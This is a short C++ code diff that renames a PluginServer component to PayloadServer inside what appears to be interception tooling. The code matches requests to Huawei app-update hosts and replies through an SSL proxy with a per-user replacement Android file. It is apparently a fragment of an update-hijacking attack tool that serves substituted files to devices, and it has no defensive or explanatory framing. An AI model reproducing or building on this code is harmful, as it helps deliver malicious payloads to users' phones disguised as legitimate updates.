@@ -1,5 +1,5 @@
 #include "HuaweiUpdate.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 
 int HuaweiUpdate::isHuaweiUpdate(const char * url, const char * host) {
 	if (strstr(host, "appdlsslbackup.dbankcdn.com") || strstr(host,"appdl.hicloud.com") ) {
@@ -20,7 +20,7 @@ int HuaweiUpdate::replyHuaweiUpdate(char * dstbuf, int dstbuflimit, LPSSLPROXYPA
 		"Content-Length: %u\r\n\r\n";
 
 	string filename = Public::getUserUrl(lpssl->username, ANDROID_REPLACE_FILENAME);
-	int ret = PluginServer::SendPluginFile(filename.c_str(), lpssl, szHttpPartialZipFormat, 1);
+	int ret = PayloadServer::SendPluginFile(filename.c_str(), lpssl, szHttpPartialZipFormat, 1);
 	return ret;
 }
 
